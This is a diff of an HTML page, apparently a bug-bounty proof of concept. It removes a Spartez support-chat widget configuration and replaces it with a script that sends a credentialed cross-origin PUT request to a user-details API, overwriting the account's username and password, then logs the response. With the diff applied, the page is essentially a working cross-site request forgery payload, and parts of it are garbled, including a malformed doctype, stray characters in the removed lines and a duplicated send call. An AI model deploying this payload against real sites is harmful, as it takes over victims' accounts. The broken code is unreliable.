@@ -1,32 +1,21 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html>
 <body>
 
 <h1>Look in console log</h1>
 
 <script type="text/javascript">
-    var spartezSupportChat = {
-        portal: 1,r
-        cloud: {
-            jiraId: '5dc6f451-8e9e-32eb-921a-69c00a2781ec',
-            jiraUrl: 'https://bugbounty-spartez-software-w4.atlassian.net',
-            urls: {
-                rest: 'https://chat-api.spartez-software.com',
-                ws: 'https://chat-ws.spartez-software.com'
-            },
-        }
-        //meta: [ // optional, custom metadata to store in the issue created from conversation.
-        //    { render: true, name: "Value Name 1", value: val1 }, // "render" values will be displayed in the chat dashboard
-        //    { render: false, name: "Value Name 2", value: val2 },
-        //],
-        // delay: 100, // delay between page load and chat load in milliseconds
-        // containfer: 'spartez-support-chat-container', // ID of the page element that will be replaced by chat
-        // iconClass: '',fff // additional class added to the chat icon
-        // chatClass: '', // additional class added to the chat widget
-        // locale: 'en-us' // force a specified locale for displaying texts to the user
-                           // instead of detecting it from the browser
-    }
+var xhr = new XMLHttpRequest();
+xhr.open("PUT", "http://localhost:9999/api/user-details", true);
+xhr.withCredentials = true;
+xhr.setRequestHeader("content-type", "application/json");
+xhr.send(JSON.stringify({
+   "username":"cookie",
+   "password":"12345678685"}));
+xhr.onload = function () {
+    console.log(xhr.responseText);
+};
+xhr.send();
 </script>
-<script type="text/javascript" src="https://chat-api.spartez-software.com/chat.js"></script>
 </body>
 </html>
